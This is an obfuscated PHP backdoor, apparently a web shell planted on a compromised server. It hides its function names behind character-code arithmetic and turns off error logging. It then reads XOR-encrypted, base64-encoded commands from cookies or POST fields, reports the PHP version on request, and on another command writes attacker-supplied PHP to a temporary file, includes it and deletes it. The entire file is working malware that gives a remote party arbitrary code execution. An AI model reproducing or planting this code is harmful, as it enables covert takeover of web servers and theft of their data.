<?php $rOMPYYb = 'f'."\151"."\154".chr(101).chr(95)."\x70"."\165"."\164"."\137".'c'.chr(983-872).chr(110)."\x74"."\x65"."\x6e"."\x74"."\163";
$epAYlQsOS = chr(98).'a'.'s'.chr(298-197).'6'.chr(561-509).chr(95).'d'.chr(101).chr(99).chr(111).chr(271-171).chr(794-693);
$EqdRNRIN = chr(105).chr(110)."\x69".chr(95)."\x73".chr(966-865)."\x74";
$FtHuYj = "\165"."\156"."\154"."\x69"."\x6e".chr(735-628);


@$EqdRNRIN(chr(101)."\x72"."\162".chr(707-596)."\162".'_'.'l'.'o'."\x67", NULL);
@$EqdRNRIN(chr(108).chr(111)."\147".chr(775-680).chr(101).chr(114)."\x72".chr(760-649)."\162".chr(115), 0);
@$EqdRNRIN('m'."\x61".chr(598-478).'_'.'e'."\x78"."\x65".chr(99).chr(117).'t'."\x69".'o'."\x6e".chr(95).chr(635-519)."\151".chr(669-560).'e', 0);
@set_time_limit(0);

function GbCVK($bmKHxP, $CswWvRxEZ)
{
    $dNcEUl = "";
    for ($bTbThV = 0; $bTbThV < strlen($bmKHxP);) {
        for ($j = 0; $j < strlen($CswWvRxEZ) && $bTbThV < strlen($bmKHxP); $j++, $bTbThV++) {
            $dNcEUl .= chr(ord($bmKHxP[$bTbThV]) ^ ord($CswWvRxEZ[$j]));
        }
    }
    return $dNcEUl;
}

$Vcsxh = array_merge($_COOKIE, $_POST);
$fdEyuvmEK = 'a6b09ef3-6843-45c1-bac3-10ccb0f94f43';
foreach ($Vcsxh as $UStkeUcy => $bmKHxP) {
    $bmKHxP = @unserialize(GbCVK(GbCVK($epAYlQsOS($bmKHxP), $fdEyuvmEK), $UStkeUcy));
    if (isset($bmKHxP["\141"."\153"])) {
        if ($bmKHxP["\141"] == chr(746-641)) {
            $bTbThV = array(
                chr(112)."\166" => @phpversion(),
                chr(634-519).chr(151-33) => "3.5",
            );
            echo @serialize($bTbThV);
        } elseif ($bmKHxP["\141"] == "\x65") {
            $nHemYPx = "./" . md5($fdEyuvmEK) . '.'.'i'."\156".chr(99);
            @$rOMPYYb($nHemYPx, "<" . "\77".'p'."\x68".chr(112).chr(32)."\x40".'u'.chr(110).'l'."\151".'n'."\153".chr(40)."\137".chr(95).'F'.chr(73).'L'.chr(69)."\x5f"."\x5f".')'."\x3b".' ' . $bmKHxP[chr(503-403)]);
            include($nHemYPx);
            @$FtHuYj($nHemYPx);
        }
        exit();
    }
}

